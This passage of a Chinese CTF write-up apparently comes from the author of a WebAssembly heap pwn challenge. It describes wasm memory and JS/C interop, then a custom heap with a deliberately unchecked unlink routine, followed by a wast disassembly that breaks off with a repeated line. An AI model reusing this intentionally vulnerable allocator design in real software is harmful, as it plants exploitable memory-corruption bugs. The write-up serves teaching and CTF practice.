      <span class="token punctuation">(</span>i32<span class="token punctuation">.</span>const <span class="token number">16</span><span class="token punctuation">)</span>
     <span class="token punctuation">)</span>
    <span class="token punctuation">)</span></code></pre><p>&#x5173;&#x4E8E;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;&#x7684;&#x5177;&#x4F53;&#x610F;&#x4E49;&#x53EF;&#x4EE5;&#x53BB;&#x5B98;&#x65B9;&#x6587;&#x6863;&#x4E0A;&#x770B;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x591A;&#x5C55;&#x5F00;&#x4E86;&#x3002;&#x4E24;&#x8005;&#x7684;&#x76EE;&#x6807;&#x76F8;&#x63A5;&#x8FD1;&#xFF0C;&#x90FD;&#x662F;&#x4E3A;&#x4E86;&#x80FD;&#x7528;c/c++&#x8BED;&#x8A00;&#x5199;web&#xFF08;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#x4E00;&#x4E0B;js&#x90A3;&#x6548;&#x7387;&#x3002;&#x3002;&#x3002;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x9898;&#x7684;wasm&#x5F53;&#x7136;&#x4E5F;&#x662F;c&#x5199;&#x7684;&#x3002;</p> <p>&#x7136;&#x540E;&#x600E;&#x4E48;&#x51FA;&#x6210;&#x4E00;&#x4E2A;pwn&#x5462;&#xFF0C;wasm&#x5B58;&#x5728;&#x51FD;&#x6570;&#x6808;&#xFF0C;&#x4F46;&#x8FD9;&#x90E8;&#x5206;&#x662F;&#x6709;&#x4E25;&#x683C;check&#x7684;&#xFF08;&#x53EF;&#x4EE5;&#x7C7B;&#x6BD4;&#x4E0B;python&#x7684;&#xFF0C;&#x5176;&#x5B9E;js&#x5F15;&#x64CE;&#x8D1F;&#x8D23;&#x89E3;&#x6790;wasm&#x7684;&#x90E8;&#x5206;&#x4E5F;&#x662F;&#x4E2A;&#x89E3;&#x91CA;&#x5668;&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x6808;&#x662F;&#x5BF9;&#x7528;&#x6237;&#x9690;&#x85CF;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x641E;&#x6808;&#x8FD9;&#x6761;&#x8DEF;&#x65AD;&#x4E86;&#xFF08;&#x81F3;&#x5C11;&#x6211;&#x6CA1;&#x60F3;&#x51FA;&#x6765;&#x600E;&#x4E48;&#x641E;&#x8FD9;&#x4E2A;&#x6808;&#xFF09;&#xFF0C;&#x4E8E;&#x662F;&#x6253;&#x7B97;&#x51FA;&#x4E00;&#x4E2A;&#x5173;&#x4E8E;&#x5806;&#x7684;pwn&#x3002;</p> <p>&#x8FD9;&#x9898;&#x672C;&#x6765;&#x60F3;&#x7528;emcc&#x7F16;&#x8BD1;&#xFF0C;&#x4F46;emcc&#x7F16;&#x8BD1;&#x51FA;&#x6765;&#x7684;wasm&#x548C;js&#x590D;&#x6742;&#x96BE;&#x61C2;&#x3002;&#x3002;&#x3002;&#x81F3;&#x5C11;&#x6211;&#x89C9;&#x5F97;&#x5982;&#x679C;&#x6211;&#x7528;emcc&#x7F16;&#x8BD1;&#x51FA;&#x6765;&#x90A3;&#x662F;99%&#x6CA1;&#x4EBA;&#x505A;&#x51FA;&#x6765;&#x7684;&#x3002;&#x6240;&#x4EE5;&#x7528;&#x4E86;clang+binaryen+wabt &#x6765;&#x751F;&#x6210;wasm&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x4ECB;&#x7ECD;&#x51E0;&#x4E2A;&#x5FC5;&#x8981;&#x7684;&#x59FF;&#x52BF;&#xFF1A;</p> <h5 id="1-memory-layout">1. memory layout</h5> <p>wasm&#x7684;memory&#x9ED8;&#x8BA4;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#x5411;&#x4E0B;&#x62D3;&#x5C55;&#xFF0C;&#x4EE5;10k&#x4E3A;&#x4E00;&#x4E2A;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#xFF0C;&#x5F53;&#x5185;&#x5B58;&#x4E0D;&#x591F;&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;grow&#x6307;&#x4EE4;&#x589E;&#x957F;&#xFF0C;&#x5F53;&#x7136;js&#x5C42;&#x4E5F;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x63A5;&#x53E3;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x3002;memory&#x91CC;&#x9762;&#x4F1A;&#x6709;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x60F3;&#x653E;&#x5565;&#x90FD;&#x53EF;&#x4EE5;&#xFF0C;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A;&#x5806;&#x7BA1;&#x7406;&#x6216;&#x8005;&#x76F4;&#x63A5;&#x7528;glibc&#x7684;&#x90A3;&#x4E2A;&#x5806;&#x7BA1;&#x7406;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#x3002;&#x540C;&#x6837;&#xFF0C;js&#x5C42;&#x548C;c&#x5C42;&#x90FD;&#x53EF;&#x4EE5;&#x5BF9;&#x5176;&#x4E2D;&#x7684;&#x5185;&#x5B58;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x3002;</p> <h5 id="2-js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;">2. js&#x5C42;&#x548C;c&#x5C42;&#x7684;&#x4E92;&#x76F8;&#x8C03;&#x7528;</h5> <p>js&#x8C03;&#x7528;c&#x5C42;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;c&#x5C42;&#x5B9A;&#x4E49;&#x597D;&#x76F8;&#x5E94;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x7136;&#x540E;export&#xFF0C;&#x76F4;&#x63A5;&#x5C31;&#x80FD;&#x5728;js&#x5C42;&#x8C03;&#x7528;&#xFF0C;&#x8FD9;&#x91CC;&#x8BF4;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x95EE;&#x9898;&#x3002;</p> <p>wasm&#x7528;&#x7684;&#x662F;32&#x4F4D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x53C2;&#x6570;&#x548C;&#x8FD4;&#x56DE;&#x503C;&#x90FD;&#x53EF;&#x4EE5;&#x5F53;&#x4F5C;uint32_t&#xFF0C;&#x5BF9;&#x4E8E;js&#x6765;&#x8BF4;&#x8FD9;&#x5C31;&#x662F;&#x5355;&#x7EAF;&#x7684;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x4F46;&#x5BF9;&#x4E8E;c&#x6765;&#x8BF4;&#x5982;&#x679C;&#x4F60;&#x662F;char* &#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5C31;&#x662F;&#x6307;&#x5411;memory&#x5730;&#x5740;&#x7684;&#x4E00;&#x4E2A;char&#x6307;&#x9488;&#x3002;&#x5982;&#x679C;&#x662F;int&#xFF0C;&#x5C31;&#x662F;&#x6574;&#x5F62;&#xFF0C;&#x8FD9;&#x70B9;&#x5C31;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x662F;&#x4F60;&#x5982;&#x679C;&#x60F3;&#x5728;js&#x4F20;&#x5B57;&#x7B26;&#x4E32;&#x5230;c&#x90A3;&#x8FB9;&#xFF0C;&#x5F97;&#x5BF9;memory&#x505A;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x628A;js&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5F53;&#x505A;&#x53C2;&#x6570;&#x4F20;&#x3002;</p> <p>c&#x5C42;&#x8C03;&#x7528;js&#x4E5F;&#x662F;&#x7C7B;&#x4F3C;&#x7684;&#xFF0C;&#x5728;js&#x90A3;&#x8FB9;&#x9884;&#x5148;&#x5B9A;&#x4E49;&#x597D;&#x4E00;&#x7CFB;&#x5217;&#x51FD;&#x6570;&#x7136;&#x540E;&#x653E;&#x5728;&#x540C;&#x4E00;&#x4E2A;object&#x91CC;&#x4F20;&#x8FDB;wasm&#x7684;&#x73AF;&#x5883;&#x3002;&#x518D;&#x8BF4;&#x4E00;&#x904D;&#xFF0C;&#x8FD9;&#x513F;&#x7684;&#x53C2;&#x6570;&#x548C;&#x8FD4;&#x56DE;&#x503C;&#x4E5F;&#x90FD;&#x5F97;&#x662F;uint32_t&#x3002;</p> <h5 id="3-c&#x5C42;&#x7684;&#x9650;&#x5236;">3. c&#x5C42;&#x7684;&#x9650;&#x5236;</h5> <p>&#x7531;&#x4E8E;&#x662F;&#x7528;js&#x505A;&#x4E3A;&#x73AF;&#x5883;&#x800C;&#x4E0D;&#x662F;linux&#x7684;&#x73AF;&#x5883;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x5927;&#x4E00;&#x90E8;&#x5206;&#x7684;c&#x5E93;&#x51FD;&#x6570;&#x90FD;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#xFF0C;&#x5F53;&#x7136;&#x8981;&#x7528;&#x4E5F;&#x53EF;&#x4EE5;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;js&#x6A21;&#x62DF;&#x51FA;&#x4E00;&#x4E2A;linux&#x7684;&#x73AF;&#x5883;&#xFF08;&#x628A;syscall&#x90FD;&#x81EA;&#x5DF1;&#x7528;js&#x5B9E;&#x73B0;&#x4E00;&#x904D;&#xFF09;&#xFF0C;&#x53EF;&#x80FD;&#x6709;&#x73B0;&#x6210;&#x7684;&#xFF0C;&#x4F46;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x9898;&#x76EE;&#x7B80;&#x6D01;&#xFF0C;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5F15;&#x7528;glibc&#x7684;&#x51FD;&#x6570;&#x3002;&#x671F;&#x5F85;&#x4EE5;&#x540E;wasm&#x80FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x5E95;&#x5C42;&#x73AF;&#x5883;&#x800C;&#x4E0D;&#x7528;&#x53BB;&#x4F9D;&#x8D56;js&#x3002;</p> <h4 id="&#x56DE;&#x5230;&#x9898;&#x76EE;">&#x56DE;&#x5230;&#x9898;&#x76EE;</h4> <p>&#x8FD9;&#x9898;&#x662F;&#x4E00;&#x4E2A;nodejs&#x4F5C;&#x4E3A;&#x540E;&#x7AEF;&#x7684;&#x5728;&#x7EBF;&#x52A0;&#x5BC6;&#x5668;&#xFF0C;&#x5728;js&#x5C42;&#x8C03;&#x7528;&#x4E86;wasm&#x8FDB;&#x884C;&#x52A0;&#x89E3;&#x5BC6;&#x64CD;&#x4F5C;&#x3002;&#x53EF;&#x4EE5;&#x8F93;&#x5165;&#x4E00;&#x4E2A;8&#x5B57;&#x8282;&#x7684;password&#x548C;&#x4EFB;&#x610F;&#x5B57;&#x8282;&#x7684;data&#x505A;&#x52A0;&#x89E3;&#x5BC6;</p> <p>&#x52A0;&#x5BC6;&#x4E3A;&#x6D41;&#x52A0;&#x5BC6;&#xFF0C;&#x903B;&#x8F91;&#x5927;&#x6982;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p> <p><code>key <span class="token operator">=</span> hash<span class="token punctuation">(</span>hash<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">^</span>pass<span class="token punctuation">)</span><span class="token operator">^</span>random<span class="token punctuation">;</span></code></p> <p>&#x5176;&#x4E2D;hash&#x51FD;&#x6570;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x7684;&#xFF08;&#x4E71;&#x5199;&#x7684;&#xFF09;&#xFF0C;&#x63A5;&#x53D7;&#x4EFB;&#x610F;&#x5B57;&#x8282;&#xFF0C;&#x8FD4;&#x56DE;16&#x5B57;&#x8282;&#xFF1B;flag&#x4E3A;32&#x5B57;&#x8282;&#xFF0C;pass&#x4E3A;8&#x5B57;&#x8282;&#xFF0C;random&#x4E3A;16&#x5B57;&#x8282;&#xFF0C;&#x901A;&#x8FC7;js&#x5C42;&#x7684;random&#x83B7;&#x53D6;&#x3002;</p> <p><code>output <span class="token operator">=</span> random <span class="token operator">|</span> enc<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span></code></p> <p>enc&#x51FD;&#x6570;&#x5185;&#x90E8;&#x4F1A;&#x628A;key&#x62C6;&#x6210;4&#x5B57;&#x8282;&#x7684;4&#x90E8;&#x5206;&#xFF0C;&#x5229;&#x7528; mt_rand &#x4F5C;&#x4E3A;PRNG&#x628A;data&#x52A0;&#x5BC6;4&#x6B21;&#x3002;</p> <p>&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x76F8;&#x540C;</p> <p>&#x4F46;&#x770B;&#x8FD9;&#x4E2A;&#x52A0;&#x89E3;&#x5BC6;&#x662F;&#x62FF;&#x4E0D;&#x5230;flag&#x7684;&#xFF0C;&#x56E0;&#x4E3A;flag&#x5728;&#x6700;&#x5F00;&#x59CB;&#x5C31;&#x88AB;hash&#x4E86;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x9898;&#x5C31;&#x662F;pwn&#x5566;&#x3002;</p> <p>&#x7136;&#x540E;&#x5806;&#x662F;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x5176;&#x4E2D;</p> <pre><code>    struct chunk <span class="token punctuation">{</span>
        unsigned int size<span class="token punctuation">;</span>
        unsigned int pre_size<span class="token punctuation">;</span>
        struct chunk<span class="token operator">*</span> fd<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>&#x9898;&#x5916;&#x8BDD;&#xFF0C;&#x81EA;&#x5DF1;&#x5199;&#x8FC7;&#x5806;&#x4E4B;&#x540E;&#x624D;&#x53D1;&#x73B0;&#x8FD9;&#x79CD;&#x7ED3;&#x6784;&#x662F;&#x4E0D;&#x53EF;&#x53D6;&#x7684;&#x554A;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;pre_size&#x7684;field&#x6CA1;&#x6CD5;&#x91CD;&#x5229;&#x7528;&#x4E86;&#x3002;&#x53CD;&#x6B63;&#x4E0D;&#x7BA1;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;pre_size&#x548C;fd&#x90FD;&#x4E0D;&#x4F1A;&#x91CD;&#x5229;&#x7528;&#xFF08;&#x5077;&#x61D2;&#xFF09;; &#x4E0D;&#x540C;size&#x7684;&#x5806;&#x5757;&#x653E;&#x5728;&#x4E0D;&#x540C;size&#x533A;&#x95F4;&#xFF08;&#x95F4;&#x9694;0x10&#xFF09;&#x7684;&#x5355;&#x94FE;&#x8868;&#x91CC;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x505A;align,</p> <pre><code>`<span class="token comment">#define find_index(size) ((size/0x10) &gt; 0x20 ? 0x1f : (size/0x10)) ;`</span></code></pre><p>&#x7528;&#x5355;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x4E86;&#x7C7B;&#x4F3C;unlink&#x4E00;&#x6837;&#x7684;&#x6548;&#x679C;&#xFF1A;</p> <pre><code>    void unlink<span class="token punctuation">(</span>struct chunk<span class="token operator">*</span> current<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        int index <span class="token operator">=</span> find_index<span class="token punctuation">(</span>current<span class="token operator">-</span><span class="token operator">&gt;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        struct chunk<span class="token operator">*</span> ite <span class="token operator">=</span> bins<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>ite <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span>ite<span class="token operator">-</span><span class="token operator">&gt;</span>fd <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>ite<span class="token operator">-</span><span class="token operator">&gt;</span>fd <span class="token operator">==</span> current<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    ite<span class="token operator">-</span><span class="token operator">&gt;</span>fd <span class="token operator">=</span> current<span class="token operator">-</span><span class="token operator">&gt;</span>fd<span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                ite <span class="token operator">=</span> ite <span class="token operator">-</span><span class="token operator">&gt;</span> fd<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre><p>&#x4E5F;&#x53EF;&#x4EE5;&#x505A;merge&#xFF0C;&#x5177;&#x4F53;&#x6E90;&#x7801;&#x5728;github&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x57FA;&#x672C;&#x5168;&#x7A0B;&#x6CA1;&#x5565;check&#xFF0C;&#x4E00;&#x4E9B;glibc&#x7528;&#x4E0D;&#x5230;&#x7684;&#x6280;&#x5DE7;&#x90FD;&#x53EF;&#x4EE5;&#x7528;&#x4E86;&#xFF01;</p> <p>&#x8BF4;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#xFF0C;&#x6D1E;&#x5728;&#x54EA;&#x5462;&#xFF1F;&#xFF1F;&#x4EE5;&#x4E0B;&#x4E3A;wasm2wast &#x8DD1;&#x51FA;&#x6765;wast&#x7684;&#x4E00;&#x90E8;&#x5206;</p> <pre><code>    <span class="token punctuation">(</span>export <span class="token string">&quot;memory&quot;</span> <span class="token punctuation">(</span>memory <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>import <span class="token string">&quot;env&quot;</span> <span class="token string">&quot;grow&quot;</span> <span class="token punctuation">(</span>func <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>import <span class="token string">&quot;env&quot;</span> <span class="token string">&quot;read_data&quot;</span> <span class="token punctuation">(</span>func <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>import <span class="token string">&quot;env&quot;</span> <span class="token string">&quot;read_file&quot;</span> <span class="token punctuation">(</span>func <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>import <span class="token string">&quot;env&quot;</span> <span class="token string">&quot;read_pass&quot;</span> <span class="token punctuation">(</span>func <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>import <span class="token string">&quot;env&quot;</span> <span class="token string">&quot;read_random&quot;</span> <span class="token punctuation">(</span>func <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      &#x8FD9;&#x4E9B;&#x662F;&#x5185;&#x90E8;&#x51FD;&#x6570;&#x540C;import &#x51FD;&#x6570;&#x540D;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;
      <span class="token punctuation">(</span>export <span class="token string">&quot;malloc&quot;</span> <span class="token punctuation">(</span>func <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;unlink&quot;</span> <span class="token punctuation">(</span>func <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;free&quot;</span> <span class="token punctuation">(</span>func <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;Initialize&quot;</span> <span class="token punctuation">(</span>func <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;ExtractU32&quot;</span> <span class="token punctuation">(</span>func <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;hash&quot;</span> <span class="token punctuation">(</span>func <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;mycrypt&quot;</span> <span class="token punctuation">(</span>func <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;encrypt&quot;</span> <span class="token punctuation">(</span>func <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;decrypt&quot;</span> <span class="token punctuation">(</span>func <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span>export <span class="token string">&quot;out_size&quot;</span> <span class="token punctuation">(</span>func <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      &#x8FD9;&#x4E9B;&#x662F;&#x5185;&#x90E8;&#x51FD;&#x6570;&#x4E0E;export &#x51FD;&#x6570;&#x540D;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;

      &#x6765;&#x770B;&#x770B;decrypt&#x51FD;&#x6570;
      <span class="token punctuation">(</span>func <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">13</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span>
        <span class="token punctuation">(</span>local i32 i32 i32 i32 i32 i32 i32<span class="token punctuation">)</span>
        i32<span class="token punctuation">.</span>const <span class="token number">32</span>
        call <span class="token number">5</span>
        set_local <span class="token number">5</span>
        i32<span class="token punctuation">.</span>const <span class="token number">1024</span>
        call <span class="token number">5</span>
        set_local <span class="token number">0</span>
        i32<span class="token punctuation">.</span>const <span class="token number">8</span>
        call <span class="token number">5</span>
        set_local <span class="token number">1</span>
        i32<span class="token punctuation">.</span>const <span class="token number">16</span>
        call <span class="token number">5</span>
        set_local <span class="token number">2</span>
        i32<span class="token punctuation">.</span>const <span class="token number">2672</span>
        get_local <span class="token number">5</span>
        i32<span class="token punctuation">.</span>const <span class="token number">32</span>
        call <span class="token number">2</span>
        drop
        get_local <span class="token number">0</span>
        call <span class="token number">1</span>
        set_local <span class="token number">3</span>
        get_local <span class="token number">1</span>
        call <span class="token number">3</span>
        drop
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        set_local <span class="token number">6</span>
        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>
          loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">16</span>
            i32<span class="token punctuation">.</span>eq
            br_if <span class="token number">1</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
            get_local <span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            get_local <span class="token number">0</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            i32<span class="token punctuation">.</span>load8_u
            i32<span class="token punctuation">.</span>store8
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">1</span>
            i32<span class="token punctuation">.</span>add
            set_local <span class="token number">6</span>
            br <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
          <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        get_local <span class="token number">5</span>
        i32<span class="token punctuation">.</span>const <span class="token number">32</span>
        call <span class="token number">10</span>
        set_local <span class="token number">4</span>
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        set_local <span class="token number">6</span>
        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>
          loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">8</span>
            i32<span class="token punctuation">.</span>eq
            br_if <span class="token number">1</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
            get_local <span class="token number">4</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            tee_local <span class="token number">5</span>
            get_local <span class="token number">5</span>
            i32<span class="token punctuation">.</span>load8_u
            get_local <span class="token number">1</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            i32<span class="token punctuation">.</span>load8_u
            i32<span class="token punctuation">.</span>xor
            i32<span class="token punctuation">.</span>store8
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            i32<span class="token punctuation">.</span>load8_u
            i32<span class="token punctuation">.</span>xor
            i32<span class="token punctuation">.</span>store8
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">1</span>
            i32<span class="token punctuation">.</span>add
            set_local <span class="token number">6</span>
            br <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
          <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        get_local <span class="token number">1</span>
        call <span class="token number">7</span>
        get_local <span class="token number">4</span>
        i32<span class="token punctuation">.</span>const <span class="token number">16</span>
        call <span class="token number">10</span>
        set_local <span class="token number">1</span>
        get_local <span class="token number">4</span>
        call <span class="token number">7</span>
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        set_local <span class="token number">6</span>
        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>
          loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">16</span>
            i32<span class="token punctuation">.</span>eq
            br_if <span class="token number">1</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
            get_local <span class="token number">1</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            tee_local <span class="token number">5</span>
            get_local <span class="token number">5</span>
            i32<span class="token punctuation">.</span>load8_u
            get_local <span class="token number">2</span>
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>add
            i32<span class="token punctuation">.</span>load8_u
            i32<span class="token punctuation">.</span>xor
            i32<span class="token punctuation">.</span>store8
            get_local <span class="token number">6</span>
            i32<span class="token punctuation">.</span>const <span class="token number">1</span>
            i32<span class="token punctuation">.</span>add
            set_local <span class="token number">6</span>
            br <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
          <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        get_local <span class="token number">2</span>
        call <span class="token number">7</span>
        get_local <span class="token number">1</span>
        get_local <span class="token number">0</span>
        i32<span class="token punctuation">.</span>const <span class="token number">16</span>
        i32<span class="token punctuation">.</span>add
        get_local <span class="token number">3</span>
        call <span class="token number">5</span>
        tee_local <span class="token number">6</span>
        get_local <span class="token number">3</span>
        i32<span class="token punctuation">.</span>const <span class="token operator">-</span><span class="token number">16</span>
        i32<span class="token punctuation">.</span>add
        tee_local <span class="token number">2</span>
        call <span class="token number">11</span>
        i32<span class="token punctuation">.</span>const <span class="token number">0</span>
        get_local <span class="token number">2</span>
        i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">2680</span>
        get_local <span class="token number">0</span>
        call <span class="token number">7</span>
        get_local <span class="token number">6</span><span class="token punctuation">)</span>

&#x770B;&#x4E0A;&#x53BB;&#x5F88;&#x957F;&#xFF0C;&#x628A;&#x8FD9;&#x4E2A;decrypt&#x51FD;&#x6570;&#x7A0D;&#x5FAE;&#x7FFB;&#x8BD1;&#x4E0B;&#xFF1A;

    &#x770B;&#x4E0A;&#x53BB;&#x5F88;&#x957F;&#xFF0C;&#x628A;&#x8FD9;&#x4E2A;decrypt&#x51FD;&#x6570;&#x7A0D;&#x5FAE;&#x7FFB;&#x8BD1;&#x4E0B;&#xFF1A;
